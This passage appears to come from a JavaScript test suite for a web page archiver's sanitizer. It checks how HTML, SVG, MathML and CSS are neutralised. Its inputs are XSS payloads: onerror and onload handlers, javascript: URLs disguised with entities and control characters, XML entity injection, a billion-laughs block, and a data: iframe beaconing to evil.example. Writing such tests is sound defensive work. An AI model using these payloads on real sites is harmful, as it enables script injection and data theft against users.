    ["a tag the input ends inside goes", `<svg><style><x a="</style><img src=rel.png onerror=alert(1)>`, `<svg><style>`],
    [
      "raw text and RCDATA hold no <",
      `<title>a<b &amp; c</title><textarea><img src=x></textarea><xmp><b></xmp><iframe><img src=x></iframe><noembed><img></noembed><noframes><img></noframes><style>a::after{content:"<"}</style>`,
      `<title>a&lt;b &amp; c</title><textarea>&lt;img src=x></textarea><xmp>&lt;b></xmp><iframe>&lt;img src=x></iframe><noembed>&lt;img></noembed><noframes>&lt;img></noframes><style>a::after{content:"\\3c "}</style>`,
    ],
    ["plaintext holds no <", `<plaintext><img src=x>`, `<plaintext>&lt;img src=x>`],
    [
      "an svg <a> navigates like an HTML one; data: and javascript: go nowhere; SMIL may not set an href",
      `<svg><a xlink:href="https://evil.example/"><text>click</text></a><a xlink:href="data:text/html,<b>x</b>" target=_blank>d</a><a xlink:href="java&Tab;script:alert(1)">j</a><a><set attributeName="href" to="https://evil.example/smil"/><text>s</text></a><animate attributeName="xlink:href" values="https://a.example/;https://b.example/"/></svg>`,
      `<svg><a target="_blank" rel="noopener noreferrer" xlink:href="https://evil.example/"><text>click</text></a><a xlink:href="#" target=_blank>d</a><a xlink:href="#">j</a><a><set  /><text>s</text></a><animate  /></svg>`,
    ],
    ["&colon; and &NewLine; spell javascript: too", `<a href="javascript&colon;alert(1)">a</a><a href="&NewLine;javascript:alert(1)">b</a>`, `<a href="#">a</a><a href="#">b</a>`],
    [
      "an escaped url( or @import in CSS is one",
      `<div style="background:\\75 rl(https://evil.example/a.png)"></div><style>@\\69mport "https://evil.example/x.css"; b{background:\\75 rl(rel.png)}</style>`,
      `<div style="background:url(&quot;https://evil.example/a.png&quot;)"></div><style>@\\69mport url("https://evil.example/x.css"); b{background:url("${at("rel.png")}")}</style>`,
    ],
    ["<image> is an img", `<image src="rel.png">`, `<image ${R("rel.png")}>`],
    [
      "a data: or blob: frame, object or embed loads nothing",
      `<iframe src="data:text/html,<img src=https://evil.example/beacon><script>fetch('https://evil.example/x')</script>"></iframe><object data="data:text/html,x"></object><embed src="blob:https://site.test/y"><frameset><frame src="data:,x"></frameset>`,
      `<iframe ></iframe><object ></object><embed ><frameset><frame ></frameset>`,
    ],
    ["an icon not kept is removed, extra icons too", `<link rel=icon href="/a.png"><link rel="icon" sizes=32x32 href="/b.png"><p>ok</p>`, `<p>ok</p>`],
    [
      "a script that closes itself in svg is the whole element, and what follows it stays",
      `<p>intro</p><svg><script href="x.js"/><rect/></svg><p>IMPORTANT</p><img src="a.png"><script>var x=1</script><p>after</p>`,
      `<p>intro</p><svg><rect/></svg><p>IMPORTANT</p><img ${R("a.png")}><p>after</p>`,
    ],
    ["in MathML too, and a noscript", `<math><script/><mi>x</mi></math><svg><noscript/><rect/></svg><p>after</p>`, `<math><mi>x</mi></math><svg><rect/></svg><p>after</p>`],
    ["an HTML script does not close itself", `<script/>alert(1)</script><p>after</p>`, `<p>after</p>`],
    ["any MathML element with an href is a link", `<math><mi href="data:text/html,x">a</mi><mo href="javascript:alert(1)">b</mo><mn href="https://site.test/n">c</mn></math>`, `<math><mi href="#">a</mi><mo href="#">b</mo><mn href="https://site.test/n">c</mn></math>`],
  ]
  it.each(CASES)("%s", async (_, html, expected) => {
    expect(await bodyOf(html)).toBe(expected)
  })

  it("a kept image's fragment cannot end its url()", async () => {
    const html = `<div style='background:url("a.png#);background-image:url(https://evil.example/x.png);x:(")'></div>`
    const style = parse(render(await snapshot(html, { [at("a.png")]: "image" }))).querySelector("div").getAttribute("style")
    // One url(), whose whole argument is the kept image and the fragment.
    expect(cssLinks(style, PAGE)).toEqual([])
    const [value] = cssUrls(style)
    expect(value.startsWith(dataUrl("image/png", bytesFor(at("a.png"), "image")))).toBe(true)
    expect(value.endsWith("#);background-image:url(https://evil.example/x.png);x:(")).toBe(true)
  })

  it("only the first icon is kept, and only when it was fetched", async () => {
    const first = at("/a.png")
    const kept = dataUrl("image/png", bytesFor(first, "image"))
    expect(await bodyOf(`<link rel=icon href="/a.png"><link rel="icon" sizes=32x32 href="/b.png">`, { [first]: "image" })).toBe(`<link rel=icon href="${kept}">`)
  })
})

describe("a URL is read as the URL parser reads it, controls and all", () => {
  /**
   * Every position a URL is written in: [name, its markup holding \`v\`,
   * selector, attribute, what it is]. A value naming no resource of the
   * web's becomes, by what the position is:
   *
   *   load      javascript: or vbscript: "#"; data:, blob: or about: as written
   *   embedded  javascript: or vbscript: "#"; data:, blob: or about: removed
   *   link      either "#"
   */
  const POSITIONS = [
    ["img src", (v) => `<img src="${v}">`, "img", "src", "load"],
    ["input image", (v) => `<input type="image" src="${v}">`, "input", "src", "load"],
    ["video poster", (v) => `<video poster="${v}"></video>`, "video", "poster", "load"],
    ["video src", (v) => `<video src="${v}"></video>`, "video", "src", "load"],
    ["audio src", (v) => `<audio src="${v}"></audio>`, "audio", "src", "load"],
    ["source src", (v) => `<video><source src="${v}"></video>`, "source", "src", "load"],
    ["track src", (v) => `<video><track src="${v}"></video>`, "track", "src", "load"],
    ["table background", (v) => `<table background="${v}"></table>`, "table", "background", "load"],
    ["svg image href", (v) => `<svg><image href="${v}"/></svg>`, "image", "href", "load"],
    ["svg image xlink:href", (v) => `<svg><image xlink:href="${v}"/></svg>`, "image", "xlink:href", "load"],
    ["feImage href", (v) => `<svg><filter><feImage href="${v}"/></filter></svg>`, "feImage", "href", "load"],
    ["use href", (v) => `<svg><use href="${v}"/></svg>`, "use", "href", "load"],
    ["link stylesheet", (v) => `<link rel="stylesheet" href="${v}">`, "link:not([rel=original])", "href", "load"],
    ["link icon", (v) => `<link rel="icon" href="${v}">`, "link:not([rel=original])", "href", "load"],
    ["iframe src", (v) => `<iframe src="${v}"></iframe>`, "iframe", "src", "embedded"],
    ["object data", (v) => `<object data="${v}"></object>`, "object", "data", "embedded"],
    ["embed src", (v) => `<embed src="${v}">`, "embed", "src", "embedded"],
    ["a href", (v) => `<a href="${v}">a</a>`, "a", "href", "link"],
    ["area href", (v) => `<map><area href="${v}"></map>`, "area", "href", "link"],
    ["svg a xlink:href", (v) => `<svg><a xlink:href="${v}"><text>a</text></a></svg>`, "a", "xlink:href", "link"],
    ["MathML href", (v) => `<math><mi href="${v}">a</mi></math>`, "mi", "href", "link"],
  ]
  const SCHEMES = [
    ["javascript:alert(1)", "script"],
    ["vbscript:x", "script"],
    ["data:text/html,x", "local"],
    ["blob:https://site.test/x", "local"],
    ["about:blank", "local"],
  ]
  /** [as written, as read]: what comes before the scheme. */
  const PREFIXES = [
    ["", ""],
    ["&#1;", "\x01"],
    ["&#x1F;", "\x1f"],
    ["\x01", "\x01"],
    [" &#8; ", " \x08 "],
    ["&#1;&#9;", "\x01\t"],
  ]
  const expected = (what, kind, written) => (kind === "script" || what === "link" ? "#" : what === "embedded" ? null : written)

  for (const [name, markup, selector, attribute, what] of POSITIONS) {
    for (const [scheme, kind] of SCHEMES) {
      it(`${name} · ${scheme}`, async () => {
        for (const [prefix, read] of PREFIXES) {
          const html = markup(prefix + scheme)
          const doc = await snapshot(html, {})
          const want = expected(what, kind, read + scheme)
          for (const page of [stored(doc), render(doc), render(doc, { export: true })]) {
            expect(parse(page).querySelector(selector)?.getAttribute(attribute) ?? null, `${JSON.stringify(prefix)} in ${page}`).toBe(want)
          }
          // Nothing for a capture to fetch, then or ever after; and the
          // stored page is already frozen.
          expect(pageLinks(scanHtml(html), PAGE)).toEqual([])
          expect(pageLinks(scanHtml(stored(doc)), PAGE).filter((l) => !/^https?:$/.test(new URL(l.url).protocol))).toEqual([])
          const refrozen = await freezePage({ text: stored(doc), base: PAGE, resources: {}, blobs: doc.blobs })
          expect(new TextDecoder().decode(refrozen.html)).toBe(stored(doc))
        }
      })
    }
  }
})

describe("an SVG image, read as the XML it is", () => {
  const url = at("pic.svg")
  const SVG = `xmlns="http://www.w3.org/2000/svg"`
  /** A snapshot of a page showing `svg`, served as `type`, and the blob it keeps for it, as text. */
  async function keptSvg(svg, type = "image/svg+xml") {
    const doc = await snapshot(`<img src="pic.svg">`, { [url]: "image" }, { bytes: { [url]: text(svg) }, types: { [url]: type } })
    return { doc, kept: new TextDecoder().decode(doc.blobs[doc.resources[url].stored]) }
  }
  const laughs = Array.from({ length: 9 }, (_, i) => `<!ENTITY lol${i + 1} "${`&lol${i ? i : ""};`.repeat(10)}">`).join("")

  // Each: the SVG as served, and exactly what is kept of it.
  const CASES = [
    [
      "an XML declaration stays first, and the doctype goes",
      `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg ${SVG}><rect/></svg>`,
      `<?xml version="1.0" encoding="UTF-8"?>\n\n<svg ${SVG}><rect/></svg>`,
    ],
    [
      "an entity's markup is written out where it is used, and frozen",
      `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY e "<script>alert(1)</script><rect/>">]><svg ${SVG}>&e;</svg>`,
      `<?xml version="1.0"?><svg ${SVG}><rect/></svg>`,
    ],
    ["a character reference in an entity's value is markup when it is used", `<!DOCTYPE svg [<!ENTITY e "&#60;script>alert(1)&#60;/script>">]><svg ${SVG}>&e;</svg>`, `<svg ${SVG}></svg>`],
    ["an entity's quotes in an attribute show what they hide", `<!DOCTYPE svg [<!ENTITY q 'x" onload="alert(1)'>]><svg ${SVG} id="&q;"/>`, `<svg ${SVG} id="x" />`],
    ["an entity used in another is written out in full", `<!DOCTYPE svg [<!ENTITY a "<script>alert(1)</script>"><!ENTITY b "<g>&a;</g>">]><svg ${SVG}>&b;</svg>`, `<svg ${SVG}><g></g></svg>`],
    [
      "Illustrator's namespace entities are written out",
      `<?xml version="1.0"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [\n\t<!ENTITY ns_svg "http://www.w3.org/2000/svg">\n\t<!ENTITY ns_xlink "http://www.w3.org/1999/xlink">\n]>\n<svg xmlns="&ns_svg;" xmlns:xlink="&ns_xlink;"><rect/></svg>`,
      `<?xml version="1.0"?>\n\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><rect/></svg>`,
    ],
    ["not in a comment or a CDATA section", `<!DOCTYPE svg [<!ENTITY e "E">]><svg ${SVG}><!-- &e; --><text><![CDATA[&e;]]>&e;</text></svg>`, `<svg ${SVG}><!-- &e; --><text>&amp;e;E</text></svg>`],
    ["a billion laughs is not written out, and the doctype goes all the same", `<!DOCTYPE svg [<!ENTITY lol "lol">${laughs}]><svg ${SVG}>&lol9;</svg>`, `<svg ${SVG}>&lol9;</svg>`],
    ["the defaults of an attribute list go with the doctype", `<!DOCTYPE svg [<!ATTLIST svg onload CDATA "alert(1)">]><svg ${SVG}><rect/></svg>`, `<svg ${SVG}><rect/></svg>`],
    ["a prefixed script is a script", `<x:svg xmlns:x="http://www.w3.org/2000/svg"><x:script>alert(1)</x:script><x:rect/></x:svg>`, `<x:svg xmlns:x="http://www.w3.org/2000/svg"><x:rect/></x:svg>`],
    ["an XHTML script in a foreignObject is a script", `<svg ${SVG}><foreignObject><h:script xmlns:h="http://www.w3.org/1999/xhtml">alert(1)</h:script></foreignObject></svg>`, `<svg ${SVG}><foreignObject></foreignObject></svg>`],
    ["a prefixed href is an href", `<svg ${SVG} xmlns:l="http://www.w3.org/1999/xlink"><a l:href="javascript:alert(2)"><text>x</text></a></svg>`, `<svg ${SVG} xmlns:l="http://www.w3.org/1999/xlink"><a l:href="#"><text>x</text></a></svg>`],
    ["a script that closes itself is the whole element", `<svg ${SVG}><script href="x.js"/><rect/></svg>`, `<svg ${SVG}><rect/></svg>`],
  ]
  it.each(CASES)("%s", async (_, svg, expectedSvg) => {
    const { doc, kept } = await keptSvg(svg)
    expect(kept).toBe(expectedSvg)
    // Shown as it is kept: frozen again on the way out, it is the same.
    expect(fromDataUrl(parse(render(doc)).querySelector("img").getAttribute("src"))).toEqual({ mimeType: "image/svg+xml", bytes: text(kept) })
  })

  it("is frozen whatever type it was served as; another image with <svg in it is kept as received", async () => {
    expect((await keptSvg(`<svg ${SVG} onload="alert(1)"><rect/></svg>`, "image/png")).kept).toBe(`<svg ${SVG} ><rect/></svg>`)
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, ...text(`<svg onload="alert(1)">`)])
    const doc = await snapshot(`<img src="pic.svg">`, { [url]: "image" }, { bytes: { [url]: png } })
    expect(doc.blobs[doc.resources[url].stored]).toEqual(png)
  })

  it("whatever an ni: URI names as SVG is shown frozen as SVG", async () => {
    const sheet = at("s.css")
    const doc = await snapshot(`<link rel=stylesheet href="s.css">`, { [sheet]: "style" }, { sheets: { [sheet]: `<svg ${SVG} onload="alert(1)"><rect/></svg>` } })
    const sha256 = doc.resources[sheet].stored
    doc.html = text(`${stored(doc)}<img id=s src="${niUrl(sha256, "image/svg+xml")}">`)
    const shown = fromDataUrl(parse(render(doc)).querySelector("#s").getAttribute("src"))
    expect(new TextDecoder().decode(shown.bytes)).toBe(`<svg ${SVG} ><rect/></svg>`)
  })

  /** A data:image/svg+xml URL of `svg`, base64. */
  const svgUrl = (svg) => dataUrl("image/svg+xml", text(svg))
  const evil = `<svg ${SVG} onload="alert(1)"><rect/></svg>`
  const frozen = `<svg ${SVG} ><rect/></svg>`
  const percent = `data:image/svg+xml,${encodeURIComponent(evil)}`
  const DATA_CASES = [
    ["in an img, as written", `<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'><rect/></svg>">`, `<img src="${svgUrl(`<svg xmlns='http://www.w3.org/2000/svg' ><rect/></svg>`)}">`],
    ["percent-encoded", `<img src="${percent}">`, `<img src="${svgUrl(frozen)}">`],
    ["base64, with a charset", `<img src="${svgUrl(evil).replace("svg+xml;", "svg+xml;charset=utf-8;")}">`, `<img src="${svgUrl(frozen)}">`],
    ["behind a control character", `<img src="&#1;${svgUrl(evil)}">`, `<img src="${svgUrl(frozen)}">`],
    ["in an svg image", `<svg><image href="${svgUrl(evil)}"/></svg>`, `<svg><image href="${svgUrl(frozen)}"/></svg>`],
    ["in a style attribute", `<div style="background:url('${svgUrl(evil)}')"></div>`, `<div style="background:url(&quot;${svgUrl(frozen)}&quot;)"></div>`],
    ["in a style element", `<style>b{background:url(${svgUrl(evil)})}</style>`, `<style>b{background:url("${svgUrl(frozen)}")}</style>`],
    ["left as written when it holds nothing to remove", `<img src="${percent.replace(encodeURIComponent(' onload="alert(1)"'), "")}">`, `<img src="${percent.replace(encodeURIComponent(' onload="alert(1)"'), "")}">`],
    ["shown as nothing when it does not decode", `<img src="data:image/svg+xml;base64,P!">`, `<img src="data:image/svg+xml;base64,">`],
  ]
  it.each(DATA_CASES)("written into the page as a data: URL, %s, is frozen", async (_, html, expectedBody) => {
    expect(await bodyOf(html)).toBe(expectedBody)
    const doc = await snapshot(html, {})
    expect(stored(doc).slice(PREFIX.length)).toBe(expectedBody)
  })
})
